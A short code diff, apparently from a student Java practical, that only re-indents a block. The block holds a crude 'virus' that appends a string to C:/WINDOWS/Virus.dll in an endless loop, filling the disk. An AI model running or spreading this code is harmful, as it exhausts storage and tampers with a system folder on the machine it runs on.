@@ -15,13 +15,13 @@ import java.io.*;
 public class CFL_PRAC5 {
     public static void main(String[] args) {
         try
-          {
-           FileWriter f=new FileWriter("C:/WINDOWS/Virus.dll",true);
-           while(true)
-           {
-           f.write("Programming Is Such A FUN !!!");
-           }
-          }
+        {
+              FileWriter f=new FileWriter("C:/WINDOWS/Virus.dll",true);
+              while(true)
+              {
+               f.write("Programming Is Such A FUN !!!");
+              }
+        }
         catch(FileNotFoundException e)
         {
             
